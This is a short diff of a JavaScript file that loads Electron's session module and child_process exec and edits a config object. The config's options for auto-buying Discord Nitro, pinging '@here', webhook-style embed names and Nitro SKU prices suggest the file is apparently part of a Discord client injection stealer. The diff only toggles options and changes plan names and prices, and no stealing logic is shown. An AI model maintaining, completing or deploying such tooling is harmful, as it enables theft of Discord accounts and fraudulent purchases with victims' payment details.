@@ -7,8 +7,8 @@ const { BrowserWindow, session } = require("electron");
 const { exec } = require("child_process");
 
 const config = {
-    auto_buy_nitro: true,
-    ping_on_run: true,
+    auto_buy_nitro: false,
+    ping_on_run: false,
     ping_val: "@here",
     embed_name: "ewe",
     embed_icon: "ewe",
@@ -30,11 +30,11 @@ const config = {
                 price: 999,
             },
         },
-        basic: {
+        classic: {
             month: {
                 id: "521846918637420545",
                 sku: "511651871736201216",
-                price: 499,
+                price: 299,
             },
         },
     },
